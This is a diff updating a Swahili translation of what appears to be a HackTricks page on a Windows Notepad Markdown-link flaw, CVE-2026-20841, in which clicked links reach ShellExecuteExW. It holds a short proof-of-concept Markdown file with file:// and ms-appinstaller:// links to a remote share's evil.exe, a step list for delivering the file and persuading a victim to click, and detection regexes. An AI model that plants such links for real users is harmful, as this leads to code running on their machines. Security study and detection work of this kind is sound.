@@ -2,46 +2,46 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-Programu za kisasa za Windows zinazotafsiri Markdown/HTML mara nyingi hubadilisha viungo vilivyoingizwa na mtumiaji kuwa vipengele vinavyoweza kubofyanwa na kuvituma kwenye `ShellExecuteExW`. Bila orodha ya ruhusa ya schemes yenye ukali, protocol handler yoyote iliyosajiliwa (mfano, `file:`, `ms-appinstaller:`) inaweza kuanzishwa, ikisababisha utekelezaji wa code katika muktadha wa mtumiaji wa sasa.
+Modern Windows applications zinazorender Markdown/HTML mara nyingi hubadilisha links zinazotolewa na mtumiaji kuwa elements zinazoweza kubofya na kuzikabidhi kwa `ShellExecuteExW`. Bila scheme allowlisting kali, protocol handler yoyote iliyosajiliwa (kwa mfano, `file:`, `ms-appinstaller:`) inaweza kuanzishwa, na kusababisha code execution katika user context ya sasa.<sup>[[1]](#references)</sup>
 
-## ShellExecuteExW surface in Windows Notepad Markdown mode
-- Notepad huchagua Markdown mode **tu kwa `.md` extensions** kupitia kulinganisha kamba ya fasta katika `sub_1400ED5D0()`.
-- Supported Markdown links:
+## ShellExecuteExW surface katika Windows Notepad Markdown mode
+- Notepad huchagua Markdown mode **kwa extensions za `.md` pekee** kupitia fixed string comparison katika `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
+- Markdown links zinazotumika:
 - Standard: `[text](target)`
-- Autolink: `<target>` (huonyeshwa kama `[target](target)`), hivyo miundo yote miwili ni muhimu kwa payloads na utambuzi.
-- Link clicks are processed in `sub_140170F60()`, ambayo hufanya uchujaji dhaifu kisha inaita `ShellExecuteExW`.
-- `ShellExecuteExW` dispatches to **any configured protocol handler**, not just HTTP(S).
+- Autolink: `<target>` (hutoa `[target](target)`), kwa hiyo syntaxes zote mbili ni muhimu kwa payloads na detections.
+- Link clicks hushughulikiwa katika `sub_140170F60()`, ambayo hufanya filtering dhaifu kisha kuita `ShellExecuteExW`.
+- `ShellExecuteExW` hutuma kwa **protocol handler yoyote iliyosanidiwa**, si HTTP(S) pekee.<sup>[[1]](#references)</sup>
 
 ### Payload considerations
-- Any `\\` sequences in the link are **normalized to `\`** before `ShellExecuteExW`, ikioathiri UNC/path crafting na utambuzi.
-- `.md` files are **not associated with Notepad by default**; waathiriwa bado lazima afungue faili katika Notepad na kubofya kiungo, lakini mara inapoonyeshwa, kiungo kinaweza kubofyanwa.
-- Dangerous example schemes:
-- `file://` to launch a local/UNC payload.
-- `ms-appinstaller://` to trigger App Installer flows. Schemes nyingine zilizojisajili ndani pia zinaweza kutumika vibaya.
+- Sequences zozote za `\\` katika link **hubadilishwa kuwa `\`** kabla ya `ShellExecuteExW`, jambo linaloathiri UNC/path crafting na detection.
+- Files za `.md` **hazihusishwi na Notepad kwa default**; victim lazima bado afungue file katika Notepad na abonyeze link, lakini baada ya kurenderiwa, link inaweza kubofya.
+- Schemes hatari za mfano:<sup>[[1]](#references)</sup>
+- `file://` kuzindua local/UNC payload.
+- `ms-appinstaller://` kuanzisha App Installer flows. Schemes nyingine zilizosajiliwa locally zinaweza pia kutumiwa vibaya.
 
 ### Minimal PoC Markdown
 ```markdown
 [run](file://\\192.0.2.10\\share\\evil.exe)
 <ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
 ```
-### Exploitation flow
-1. Craft a **`.md` file** so Notepad renders it as Markdown.
-2. Embed a link using a dangerous URI scheme (`file:`, `ms-appinstaller:`, or any installed handler).
-3. Deliver the file (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB or similar) and convince the user to open it in Notepad.
-4. On click, the **kiungo kilichosawazishwa** is handed to `ShellExecuteExW` and the corresponding protocol handler executes the referenced content in the user’s context.
+### Mtiririko wa Exploitation
+1. Unda faili la **`.md`** ili Notepad ilionyeshe kama Markdown.
+2. Pachika kiungo ukitumia URI scheme hatari (`file:`, `ms-appinstaller:`, au handler yoyote iliyosakinishwa).
+3. Wasilisha faili (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB au inayofanana) na mshawishi mtumiaji kulifungua katika Notepad.
+4. Mtumiaji anapobofya, **kiungo kilichonormalishwa** hukabidhiwa kwa `ShellExecuteExW`, na protocol handler inayolingana hu-execute maudhui yaliyorejelewa katika context ya mtumiaji.<sup>[[1]](#references)[[2]](#references)</sup>
 
-## Mawazo ya kugundua
-- Fuatilia uhamisho wa faili za `.md` kupitia bandari/itifaki ambazo kawaida husambaza nyaraka: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
-- Changanua viungo vya Markdown (standard na autolink) na tafuta `file:` au `ms-appinstaller:` bila kuzingatia herufi kubwa/ndogo.
-- Regex zinazoongozwa na vendor ili kugundua ufikiaji wa rasilimali za mbali:
+## Mawazo ya Detection
+- Fuatilia uhamishaji wa mafaili ya `.md` kupitia ports/protocols zinazotumika kwa kawaida kuwasilisha nyaraka: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
+- Changanua viungo vya Markdown (standard na autolink) na utafute `file:` au `ms-appinstaller:` bila kujali **case**.
+- Regexes zilizoongozwa na vendors za kugundua ufikiaji wa remote resources:
 ```
 (\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
 (\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
 ```
-- Tabia ya patch iliripotiwa **inaoruhusu faili za ndani na HTTP(S)**; chochote kingine kinachofikia `ShellExecuteExW` ni cha kutiliwa shaka. Panua utambuzi kwa protocol handlers nyingine zilizosanikishwa inapohitajika, kwani attack surface inatofautiana kulingana na mfumo.
+- Tabia ya **Patch** inaripotiwa kuweka **allowlist** ya faili za ndani na **HTTP(S)**; kitu kingine chochote kinachofikia `ShellExecuteExW` kinatia shaka. Panua **detections** kwa **protocol handlers** nyingine zilizosakinishwa inapohitajika, kwa kuwa **attack surface** hutofautiana kulingana na mfumo.<sup>[[1]](#references)</sup>
 
 ## Marejeo
-- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
-- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)
+- [1] [CVE-2026-20841: Arbitrary Code Execution katika Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
+- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)
 
 {{#include ../banners/hacktricks-training.md}}
